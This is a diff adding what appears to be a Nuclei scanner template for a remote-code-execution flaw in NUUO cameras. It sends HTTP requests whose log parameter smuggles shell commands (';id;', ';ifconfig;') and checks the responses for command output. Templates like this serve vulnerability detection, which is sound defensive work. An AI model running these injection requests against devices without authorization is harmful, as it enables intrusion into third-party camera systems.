@@ -1,0 +1,38 @@
+id: poc-yaml-nuuo-camera-handle-site-config-rce
+info:
+  name: NUUO Camera handle_site_config RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce, nuuo
+http:
+  - raw:
+      - |
+        GET /handle_site_config.php?log=;id; HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/mtd"
+          - "uid="
+          - "gid="
+        part: body
+  - raw:
+      - |
+        GET /handle_site_config.php?log=;ifconfig; HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Debugging Center"
+          - "/mtd"
+          - "eth0"
+          - "Link encap"
+        part: body
